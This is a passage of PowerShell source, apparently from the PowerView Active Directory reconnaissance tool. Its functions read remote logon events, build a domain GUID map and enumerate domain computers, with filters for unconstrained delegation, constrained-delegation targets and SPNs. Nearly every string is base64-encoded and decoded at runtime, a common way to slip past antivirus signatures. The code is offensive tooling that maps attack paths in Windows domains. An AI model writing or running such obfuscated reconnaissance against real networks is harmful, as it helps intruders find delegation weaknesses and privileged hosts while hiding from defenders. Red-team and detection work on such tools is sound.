            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($StartTime.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EndTime.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $EventArguments = @{
            'FilterXPath' = $XPathFilter
            'LogName' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHk=")))
            'MaxEvents' = $MaxEvents
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $EventArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $EventArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))] = $Computer

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    
                    4624 {
                        
                        if(-not $Properties[5].Value.EndsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JA=="))))) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvZ29uRXZlbnQ="))))
                            $Output
                        }
                    }

                    
                    4648 {
                        
                        if((-not $Properties[5].Value.EndsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JA=="))))) -and ($Properties[11].Value -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dGFza2hvc3RcLmV4ZQ=="))))) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkV4cGxpY2l0Q3JlZGVudGlhbExvZ29uRXZlbnQ="))))
                            $Output
                        }
                    }
                    default {
                        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaGFuZGxlciBleGlzdHMgZm9yIGV2ZW50IElEOiB7MH0="))) -f $($Event.Id))
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs")))}

    $ForestArguments = @{}
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ForestArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

    try {
        $SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiByZXRyaWV2aW5nIGZvcmVzdCBzY2hlbWEgcGF0aCBmcm9tIEdldC1Gb3Jlc3Q=")))
    }
    if (-not $SchemaPath) {
        throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiByZXRyaWV2aW5nIGZvcmVzdCBzY2hlbWEgcGF0aCBmcm9tIEdldC1Gb3Jlc3Q=")))
    }

    $SearcherArguments = @{
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ=="))) = $SchemaPath
        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNjaGVtYUlER1VJRD0qKQ==")))
    }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    $SchemaSearcher = Get-DomainSearcher @SearcherArguments

    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiB7MH0="))) -f $_)
                }
            }
            $SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiBidWlsZGluZyBHVUlEIG1hcDogezB9"))) -f $_)
        }
    }

    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SchemaPath.replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2NoZW1h"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWQtUmlnaHRz"))))
    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPWNvbnRyb2xBY2Nlc3NSaWdodCk=")))
    $RightsSearcher = Get-DomainSearcher @SearcherArguments

    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiB7MH0="))) -f $_)
                }
            }
            $RightsSearcher.dispose()
        }
        catch {
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiBidWlsZGluZyBHVUlEIG1hcDogezB9"))) -f $_)
        }
    }

    $GUIDs
}


function Get-DomainComputer {


    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        
        $UACValueNames = $UACValueNames | ForEach-Object {$_; (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX3swfQ=="))) -f $_)}
        
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
                }
                elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPQ==")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbg==")))
                        }
                    }
                }
                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkoZG5zaG9zdG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKQ==")))
                }
                elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                }
                else {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBmb3IgdW5jb25zdHJhaW5lZCBkZWxlZ2F0aW9u")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj01MjQyODgp")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RlZFRvQXV0aA==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgdGhhdCBhcmUgdHJ1c3RlZCB0byBhdXRoZW50aWNhdGUgZm9yIG90aGVyIHByaW5jaXBhbHM=")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG1zZHMtYWxsb3dlZHRvZGVsZWdhdGV0bz0qKQ==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbnRlcnM=")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBwcmludGVycw==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENhdGVnb3J5PXByaW50UXVldWUp")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1BO")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBTUE46ICRTUE4=")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNlcnZpY2VQcmluY2lwYWxOYW1lPSRTUE4p")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBvcGVyYXRpbmcgc3lzdGVtOiAkT3BlcmF0aW5nU3lzdGVt")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9wZXJhdGluZ3N5c3RlbT0kT3BlcmF0aW5nU3lzdGVtKQ==")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBzZXJ2aWNlIHBhY2s6ICRTZXJ2aWNlUGFjaw==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9wZXJhdGluZ3N5c3RlbXNlcnZpY2VwYWNrPSRTZXJ2aWNlUGFjayk=")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBzaXRlIG5hbWU6ICRTaXRlTmFtZQ==")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNlcnZlcnJlZmVyZW5jZWJsPSRTaXRlTmFtZSk=")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXI=")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
            }
            
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UXy4q")))) {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkp")))
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUp")))
                }
            }

            $CompSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY5KSRGaWx0ZXIp")))
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gR2V0LURvbWFpbkNvbXB1dGVyIGZpbHRlciBzdHJpbmc6IHswfQ=="))) -f $($CompSearcher.filter))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw==")))]) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                        
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNvbXB1dGVyLlJhdw=="))))
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNvbXB1dGVy"))))
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
                }
            }
            $CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        
        $UACValueNames = $UACValueNames | ForEach-Object {$_; (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX3swfQ=="))) -f $_)}
        
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
